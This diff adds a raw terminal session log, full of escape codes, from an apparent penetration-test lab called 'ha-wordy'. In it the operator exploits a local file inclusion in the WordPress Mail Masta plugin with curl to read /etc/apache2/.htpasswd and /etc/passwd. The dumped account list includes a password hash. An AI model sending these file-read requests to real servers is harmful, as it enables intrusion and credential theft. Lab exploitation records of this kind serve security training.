@@ -1,0 +1,66 @@
+Script started on 2020-09-29 22:43:47-03:00 [TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="169" LINES="38"]
+]0;root@Pentest: /home/joaofracassi/beco-xpl/ha-wordy[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/ha-wordy[00m# https://192.168.1.104/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/apache2/.htpasswd [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cchttps://192.168.1.104/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/apache2/.htpasswd[A]0;root@Pentest: /home/joaofracassi/beco-xpl/ha-wordy[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/ha-wordy[00m# [Cuhttps://192.168.1.104/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/apache2/.htpasswd[A]0;root@Pentest: /home/joaofracassi/beco-xpl/ha-wordy[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/ha-wordy[00m# [C[Crhttps://192.168.1.104/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/apache2/.htpasswd[A]0;root@Pentest: /home/joaofracassi/beco-xpl/ha-wordy[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/ha-wordy[00m# [C[C[Clhttps://192.168.1.104/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/apache2/.htpasswd[A]0;root@Pentest: /home/joaofracassi/beco-xpl/ha-wordy[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/ha-wordy[00m# [C[C[C[C https://192.168.1.104/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/apache2/.htpa[Cswd[A]0;root@Pentest: /home/joaofracassi/beco-xpl/ha-wordy[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/ha-wordy[00m# [C[C[C[C[Cvhttps://192.168.1.104/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/apache2/.htpasswd[A]0;root@Pentest: /home/joaofracassi/beco-xpl/ha-wordy[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/ha-wordy[00m# [C[C[C[C[C[Chttps://192.168.1.104/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/apache2/.htpa[1Psswd[A]0;root@Pentest: /home/joaofracassi/beco-xpl/ha-wordy[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/ha-wordy[00m# [C[C[C[C[C-https://192.168.1.104/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/apache2/.htpasswd[A]0;root@Pentest: /home/joaofracassi/beco-xpl/ha-wordy[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/ha-wordy[00m# [C[C[C[C[C[Cvhttps://192.168.1.104/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/apache2/.htpasswd[A]0;root@Pentest: /home/joaofracassi/beco-xpl/ha-wordy[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/ha-wordy[00m# [C[C[C[C[C[C[C https://192.168.1.104/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/apache2/.htpasswd[A]0;root@Pentest: /home/joaofracassi/beco-xpl/ha-wordy[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/ha-wordy[00m# [C[C[C[C[C[C[C[C
+
+*   Trying 192.168.1.104:443...
+* connect to 192.168.1.104 port 443 failed: Conexão recusada
+* Failed to connect to 192.168.1.104 port 443: Conexão recusada
+* Closing connection 0
+curl: (7) Failed to connect to 192.168.1.104 port 443: Conexão recusada
+]0;root@Pentest: /home/joaofracassi/beco-xpl/ha-wordy[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/ha-wordy[00m# curl -v https://192.168.1.104/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/apache2/.htpasswd[A]0;root@Pentest: /home/joaofracassi/beco-xpl/ha-wordy[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/ha-wordy[00m# exit[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ccurl -v https://192.168.1.104/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/apache2/.htpasswd[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Chttps://192.168.1.104/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/apache2/.ht[1Ppasswd[A]0;root@Pentest: /home/joaofracassi/beco-xpl/ha-wordy[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/ha-wordy[00m# [C[C[C[C[C[C[Chttps://192.168.1.104/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/apache2/.htp[1Passwd[A]0;root@Pentest: /home/joaofracassi/beco-xpl/ha-wordy[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/ha-wordy[00m# [C[C[C[C[C[Chttps://192.168.1.104/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/apache2/.htpa[1Psswd[A]0;root@Pentest: /home/joaofracassi/beco-xpl/ha-wordy[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/ha-wordy[00m# [C[C[C[C[C
+
+curl: (7) Failed to connect to 192.168.1.104 port 443: Conexão recusada
+]0;root@Pentest: /home/joaofracassi/beco-xpl/ha-wordy[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/ha-wordy[00m# curl https://192.168.1.104/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/apache2/.htpasswd[A]0;root@Pentest: /home/joaofracassi/beco-xpl/ha-wordy[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/ha-wordy[00m# [C[C[C[C[C-v https://192.168.1.104/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/apache2/.htpasswd[A]0;root@Pentest: /home/joaofracassi/beco-xpl/ha-wordy[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/ha-wordy[00m# [C[C[C[C[Chttps://192.168.1.104/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/apache2/.htpa[3Psswd[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C://192.168.1.104/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/apache2/.htpas[C[1Pwd[A]0;root@Pentest: /home/joaofracassi/beco-xpl/ha-wordy[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/ha-wordy[00m# [C[C[C[C[C[C[C[C[C
+
+YWFydGk6YWFydGlAZ21haWwuY29t
+]0;root@Pentest: /home/joaofracassi/beco-xpl/ha-wordy[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/ha-wordy[00m# [K]0;root@Pentest: /home/joaofracassi/beco-xpl/ha-wordy[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/ha-wordy[00m# curl http://192.168.1.104/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+uuidd:x:105:111::/run/uuidd:/usr/sbin/nologin
+avahi-autoipd:x:106:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
+usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+rtkit:x:109:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
+cups-pk-helper:x:110:116:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
+speech-dispatcher:x:111:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
+whoopsie:x:112:117::/nonexistent:/bin/false
+kernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
+saned:x:114:119::/var/lib/saned:/usr/sbin/nologin
+pulse:x:115:120:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
+avahi:x:116:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
+colord:x:117:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+hplip:x:118:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+geoclue:x:119:124::/var/lib/geoclue:/usr/sbin/nologin
+gnome-initial-setup:x:120:65534::/run/gnome-initial-setup/:/bin/false
+gdm:x:121:125:Gnome Display Manager:/var/lib/gdm3:/bin/false
+raj:x:1000:1000:raj,,,:/home/raj:/bin/bash
+mysql:x:122:128:MySQL Server,,,:/nonexistent:/bin/false
+sshd:x:124:65534::/run/sshd:/usr/sbin/nologin
+spike:$1$spike$CxutB1qK2e4GnxLGmlXyJ.:0:0:root:/root:/bin/bash
+]0;root@Pentest: /home/joaofracassi/beco-xpl/ha-wordy[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/ha-wordy[00m# [K]0;root@Pentest: /home/joaofracassi/beco-xpl/ha-wordy[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/ha-wordy[00m# exi[K[K[K
+]0;root@Pentest: /home/joaofracassi/beco-xpl/ha-wordy[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/ha-wordy[00m# 
+]0;root@Pentest: /home/joaofracassi/beco-xpl/ha-wordy[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/ha-wordy[00m# exit
+exit
+
+Script done on 2020-09-29 22:55:23-03:00 [COMMAND_EXIT_CODE="0"]
